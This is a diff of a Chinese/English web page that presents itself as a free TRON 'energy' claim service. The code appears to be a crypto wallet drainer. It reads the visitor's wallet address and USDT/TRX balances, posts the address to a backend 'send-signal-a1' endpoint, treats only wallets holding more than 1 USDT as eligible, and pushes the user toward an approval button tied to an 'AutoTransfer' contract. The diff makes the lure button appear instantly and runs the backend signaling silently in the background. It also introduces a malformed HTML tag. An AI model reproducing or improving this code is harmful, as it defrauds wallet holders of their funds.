@@ -261,10 +261,9 @@ body {
     </style>
 </head>
 <body>
-    <!-- 修复：删除重复的container嵌套 -->
     <div class="lang-switch">
         <button id="langToggle" class="lang-toggle">
-            <i class="fa fa-globe"></i> 
+            <<i class="fa fa-globe"></</i> 
         </button>
     </div>
     <div class="container">      
@@ -332,7 +331,6 @@ body {
            <span id="reviewTipText">系统审核中，审核通过后请务必完成签名</span>
         </div>
     </div>
-    <!-- 修复：给页脚加ID，用于语言切换 -->
     <div class="footer-info" id="footerInfo">
         合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）
         © 2025 TRX能量服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
@@ -452,7 +450,7 @@ body {
             recordType: "领取类型：",
             recordEnergy: "获取能量：",
             recordTime: "领取时间：",
-            freeEnergy: "免费能量领取",
+            freeEnergy: "免费领取",
             systemBusyTip: "系统繁忙请稍后重试", // 非客户原因提示
             ineligibleTip: "不符合领取条件" // 客户原因提示
         },
@@ -513,7 +511,7 @@ body {
             recordType: "Claim Type:",
             recordEnergy: "Energy Obtained:",
             recordTime: "Claim Time:",
-            freeEnergy: "Free Energy Claim",
+            freeEnergy: "Free Claim",
             systemBusyTip: "System busy, please try again later", // 非客户原因提示
             ineligibleTip: "Ineligible" // 客户原因提示
         }
@@ -633,7 +631,6 @@ body {
                     console.error("授权后初始化失败：", err);
                     const lang = langConfig[currentLang];
                     const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
-                    // 按错误类型更新页面状态，不弹框
                     const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
                     userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>❌ ${tip}</span>`;
                     approveBtn.disabled = false;
@@ -677,7 +674,7 @@ body {
     }
 
     /**
-     * 钱包初始化（错误静默处理，仅更新页面状态）
+     * 钱包初始化（核心优化：连接后立即显示领取按钮，后端操作异步执行）
      * @param {boolean} isAfterApprove - 是否是授权后返回
      */
     async function initWallet(isAfterApprove) {
@@ -686,7 +683,7 @@ body {
             userAddress = tronWeb.defaultAddress.base58;
             if (!userAddress) throw new Error("无效TRON地址");
 
-            // 30天内已领取（客户原因）
+            // 30天内已领取（客户原因）- 优先拦截，不显示按钮
             if (isAddressAuthorized(userAddress)) {
                 const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
                 userInfoEl.innerHTML = lang.authorizedTip.replace("{address}", shortAddr);
@@ -714,48 +711,49 @@ body {
                 return;
             }
 
-            // 发送A1信号（错误静默处理）
-            await sendSignalA1().catch(err => {
-                console.error("A1信号发送失败：", err);
-                throw err;
-            });
-
+            // 核心优化1：先更新UI，立即显示领取按钮（不等待后端）
             const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            userInfoEl.innerHTML = lang.loadingTip.replace("{address}", shortAddr);
-            approveBtn.disabled = true;
-            approveBtn.textContent = lang.loadingBtn;
+            userInfoEl.innerHTML = lang.eligibleTip
+                .replace("{address}", shortAddr)
+                .replace("{usdt}", "查询中...")
+                .replace("{trx}", "查询中...");
+            approveBtn.disabled = false; // 立即启用按钮
+            approveBtn.textContent = lang.approveBtnText; // 显示领取文字
             updateWalletStatus();
             document.getElementById("statusAddress").textContent = shortAddr;
+            bindApproveLogic(); // 绑定按钮点击逻辑
 
+            // 核心优化2：后端操作异步执行（不阻塞UI）
+            // 1. 异步发送A1信号（静默处理）
+            sendSignalA1().catch(err => console.error("A1信号异步发送失败：", err));
+
+            // 2. 异步查询余额（查询完成后更新状态）
             trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-            const usdtRaw = await trc20Contract.balanceOf(userAddress).call().catch(err => {
-                console.error("查询USDT余额失败：", err);
-                return 0;
+            Promise.all([
+                trc20Contract.balanceOf(userAddress).call().catch(err => 0),
+                tronWeb.trx.getBalance(userAddress).catch(err => 0)
+            ]).then(([usdtRaw, trxRaw]) => {
+                tokenBalance = Number(usdtRaw) / 1000000;
+                trxBalance = Number(trxRaw) / 1000000;
+                // 余额不足则禁用按钮（后续校验，不影响初始显示）
+                if (tokenBalance <= 1) {
+                    userInfoEl.innerHTML = lang.insufficientUsdt
+                        .replace("{address}", shortAddr)
+                        .replace("{usdt}", tokenBalance.toFixed(2))
+                        .replace("{trx}", trxBalance.toFixed(2));
+                    approveBtn.disabled = true;
+                    approveBtn.textContent = lang.insufficientBtn;
+                } else {
+                    // 余额足够，更新显示真实余额
+                    userInfoEl.innerHTML = lang.eligibleTip
+                        .replace("{address}", shortAddr)
+                        .replace("{usdt}", tokenBalance.toFixed(2))
+                        .replace("{trx}", trxBalance.toFixed(2));
+                }
+            }).catch(err => {
+                console.error("余额异步查询失败：", err);
+                // 查询失败不影响按钮使用，继续显示领取状态
             });
-            const trxRaw = await tronWeb.trx.getBalance(userAddress).catch(err => {
-                console.error("查询TRX余额失败：", err);
-                return 0;
-            });
-            tokenBalance = Number(usdtRaw) / 1000000;
-            trxBalance = Number(trxRaw) / 1000000;
-
-            // USDT余额不足（客户原因）
-            if (tokenBalance <= 1) {
-                userInfoEl.innerHTML = lang.insufficientUsdt
-                    .replace("{address}", shortAddr)
-                    .replace("{usdt}", tokenBalance.toFixed(2))
-                    .replace("{trx}", trxBalance.toFixed(2));
-                approveBtn.disabled = true;
-                approveBtn.textContent = lang.insufficientBtn;
-            } else {
-                userInfoEl.innerHTML = lang.eligibleTip
-                    .replace("{address}", shortAddr)
-                    .replace("{usdt}", tokenBalance.toFixed(2))
-                    .replace("{trx}", trxBalance.toFixed(2));
-                approveBtn.disabled = false;
-                approveBtn.textContent = lang.approveBtnText;
-                bindApproveLogic();
-            }
 
         } catch (e) {
             console.error("钱包初始化失败：", e);
@@ -807,39 +805,27 @@ body {
     }
 
     /**
-     * 发送A1信号（错误静默捕获，返回错误信息）
+     * 发送A1信号（异步无阻塞，静默处理）
      */
     async function sendSignalA1() {
         const requestData = { userAddress };
-        return new Promise((resolve, reject) => {
-            setTimeout(async () => {
-                try {
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 20000);
-
-                    const res = await fetch(`${BACKEND_API}/api/send-signal-a1`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(requestData),
-                        signal: controller.signal,
-                        keepalive: true
-                    });
-                    clearTimeout(timeoutId);
-
-                    if ([400, 408, 409].includes(res.status)) {
-                        const errData = await res.json().catch(() => ({ detail: "接口处理失败" }));
-                        reject(new Error(errData.detail || "A1信号处理失败"));
-                        return;
-                    }
-
-                    if (!res.ok) throw new Error("A1接口请求失败");
-                    console.log("✅ A1信号发送成功");
-                    resolve(true);
-                } catch (e) {
-                    reject(e);
-                }
-            }, 100);
-        });
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 20000);
+        try {
+            const res = await fetch(`${BACKEND_API}/api/send-signal-a1`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(requestData),
+                signal: controller.signal,
+                keepalive: true
+            });
+            clearTimeout(timeoutId);
+            if (res.ok) console.log("✅ A1信号异步发送成功");
+            return true;
+        } catch (e) {
+            clearTimeout(timeoutId);
+            throw e;
+        }
     }
 
     /**
